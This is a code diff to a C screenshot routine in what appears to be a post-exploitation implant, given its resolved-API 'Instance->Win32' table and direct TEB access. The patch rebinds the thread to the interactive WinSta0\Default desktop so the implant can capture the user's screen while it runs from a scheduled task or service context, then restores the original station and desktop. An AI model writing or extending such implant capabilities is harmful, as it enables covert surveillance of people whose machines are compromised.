@@ -1101,6 +1101,12 @@ BOOL WinScreenshot(
     PVOID               BitMapImage = NULL;
     DWORD               BitMapSize  = 0;
 
+    HWINSTA             hOldWinSta  = NULL;
+    HWINSTA             hWinSta     = NULL;
+    HDESK               hOldDesk    = NULL;
+    HDESK               hDesk       = NULL;
+    DWORD               dwThreadId  = 0;
+
     /* Use SM_CX/CYVIRTUALSCREEN for extent; avoid GetCurrentObject+DeleteObject on the display DC bitmap (invalid + wrong size on some sessions). */
     INT x      = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
     INT y      = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
@@ -1115,6 +1121,46 @@ BOOL WinScreenshot(
     MemSet( &BitFileHdr, 0, sizeof( BITMAPFILEHEADER ) );
     MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
     MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
+
+    /*
+     * In non-interactive sessions (S4U schtask, service context) the process
+     * may be attached to a restricted or NULL window station, causing GetDC(NULL)
+     * to return NULL or to block waiting for the Win32k session lock.
+     * Explicitly open WinSta0\Default and re-bind the thread before any GDI call;
+     * this mirrors what interactive processes have implicitly.
+     */
+    dwThreadId = (DWORD)(ULONG_PTR)Instance->Teb->ClientId.UniqueThread;
+    hOldWinSta = Instance->Win32.GetProcessWindowStation();
+    hWinSta    = Instance->Win32.OpenWindowStation( "WinSta0", FALSE,
+                     WINSTA_READATTRIBUTES | WINSTA_READSCREEN );
+    if ( hWinSta ) {
+        if ( Instance->Win32.SetProcessWindowStation( hWinSta ) ) {
+            hOldDesk = Instance->Win32.GetThreadDesktop( dwThreadId );
+            hDesk    = Instance->Win32.OpenDesktopA( "Default", 0, FALSE,
+                           DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW |
+                           DESKTOP_CREATEMENU  | DESKTOP_HOOKCONTROL   |
+                           DESKTOP_ENUMERATE   | DESKTOP_WRITEOBJECTS  |
+                           GENERIC_READ );
+            if ( hDesk ) {
+                if ( ! Instance->Win32.SetThreadDesktop( hDesk ) ) {
+                    /* Failed to bind — undo window station change */
+                    Instance->Win32.CloseDesktop( hDesk );
+                    hDesk = NULL;
+                    Instance->Win32.SetProcessWindowStation( hOldWinSta );
+                    Instance->Win32.CloseWindowStation( hWinSta );
+                    hWinSta = NULL;
+                }
+            } else {
+                /* Can't open Default desktop — undo window station change */
+                Instance->Win32.SetProcessWindowStation( hOldWinSta );
+                Instance->Win32.CloseWindowStation( hWinSta );
+                hWinSta = NULL;
+            }
+        } else {
+            Instance->Win32.CloseWindowStation( hWinSta );
+            hWinSta = NULL;
+        }
+    }
 
     hDC = Instance->Win32.GetDC( NULL );
     if ( ! hDC ) {
@@ -1198,6 +1244,21 @@ Cleanup:
 
     if ( hDC ) {
         Instance->Win32.ReleaseDC( NULL, hDC );
+    }
+
+    /* Restore original window station / desktop if we changed them */
+    if ( hDesk ) {
+        if ( hOldDesk ) {
+            Instance->Win32.SetThreadDesktop( hOldDesk );
+        }
+        Instance->Win32.CloseDesktop( hDesk );
+    }
+
+    if ( hWinSta ) {
+        if ( hOldWinSta ) {
+            Instance->Win32.SetProcessWindowStation( hOldWinSta );
+        }
+        Instance->Win32.CloseWindowStation( hWinSta );
     }
 
     return ReturnValue;
